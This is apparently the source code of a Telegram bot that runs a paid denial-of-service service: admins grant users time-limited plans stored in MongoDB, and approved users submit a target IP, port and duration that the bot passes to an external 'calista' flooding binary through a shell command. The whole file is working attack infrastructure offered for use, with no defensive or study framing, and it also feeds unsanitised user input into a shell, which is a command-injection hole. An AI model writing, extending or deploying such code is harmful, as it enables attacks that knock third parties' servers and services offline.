import os
import telebot
import logging
import time
import asyncio
import certifi
from pymongo import MongoClient
from datetime import datetime, timedelta
from threading import Thread
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
from dotenv import load_dotenv

# Load Environment Variables
load_dotenv('enivorment.env')
TOKEN = os.getenv('TELEGRAM_TOKEN')
MONGO_URI = os.getenv('MONGO_URI')
# IDs should be comma-separated in Railway settings (e.g., 12345,67890)
ADMIN_IDS = [int(i.strip()) for i in os.getenv('ADMIN_IDS', '').split(',') if i.strip()]
CHANNEL_ID = int(os.getenv('CHANNEL_ID', -100))

# Logging Configuration
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# Database Connection
client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client['soul']
users_collection = db.users

bot = telebot.TeleBot(TOKEN)
loop = asyncio.new_event_loop()
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

def is_user_admin(user_id, chat_id):
    """Checks if the user is a hardcoded admin or a channel admin."""
    if user_id in ADMIN_IDS:
        return True
    try:
        return bot.get_chat_member(chat_id, user_id).status in ['administrator', 'creator']
    except:
        return False

async def run_attack_command_async(target_ip, target_port, duration):
    """Triggers the high-performance 'calista' binary."""
    try:
        # This triggers the powerful compiled binary with maximum permissions
        process = await asyncio.create_subprocess_shell(
            f"chmod +x calista && ./calista {target_ip} {target_port} {duration} 100"
        )
        await process.communicate()
    except Exception as e:
        logging.error(f"Binary execution error: {e}")

@bot.message_handler(commands=['approve', 'disapprove'])
def approve_or_disapprove_user(message):
    user_id = message.from_user.id
    if not is_user_admin(user_id, CHANNEL_ID):
        bot.send_message(message.chat.id, "*Unauthorized*", parse_mode='Markdown')
        return

    cmd_parts = message.text.split()
    if len(cmd_parts) < 2:
        bot.send_message(message.chat.id, "Usage: /approve <id> <plan> <days>")
        return

    action, target_id = cmd_parts[0], int(cmd_parts[1])
    
    if action == '/approve':
        plan = int(cmd_parts[2]) if len(cmd_parts) >= 3 else 1
        days = int(cmd_parts[3]) if len(cmd_parts) >= 4 else 30
        expiry = (datetime.now() + timedelta(days=days)).date().isoformat()
        users_collection.update_one({"user_id": target_id}, {"$set": {"plan": plan, "valid_until": expiry}}, upsert=True)
        bot.send_message(message.chat.id, f"User {target_id} approved until {expiry}")
    else:
        users_collection.update_one({"user_id": target_id}, {"$set": {"plan": 0}})
        bot.send_message(message.chat.id, f"User {target_id} removed.")

@bot.message_handler(commands=['Attack'])
def attack_command(message):
    user_id = message.from_user.id
    user_data = users_collection.find_one({"user_id": user_id})
    
    if not user_data or user_data.get('plan', 0) == 0:
        bot.send_message(message.chat.id, "*No access. Contact Admin.*", parse_mode='Markdown')
        return

    bot.send_message(message.chat.id, "*Enter: IP Port Time*", parse_mode='Markdown')
    bot.register_next_step_handler(message, process_attack)

def process_attack(message):
    try:
        ip, port, duration = message.text.split()
        if int(port) in blocked_ports:
            bot.send_message(message.chat.id, "Port is blocked.")
            return
        
        asyncio.run_coroutine_threadsafe(run_attack_command_async(ip, port, duration), loop)
        bot.send_message(message.chat.id, f"Attack started on {ip}:{port}")
    except:
        bot.send_message(message.chat.id, "Invalid input format.")

@bot.message_handler(commands=['start'])
def start(message):
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add("My Account🏦", "Help❓")
    bot.send_message(message.chat.id, "Console Online. System Ready.", reply_markup=markup)

def run_async_loop():
    asyncio.set_event_loop(loop)
    loop.run_forever()

if __name__ == "__main__":
    Thread(target=run_async_loop, daemon=True).start()
    bot.polling(none_stop=True)
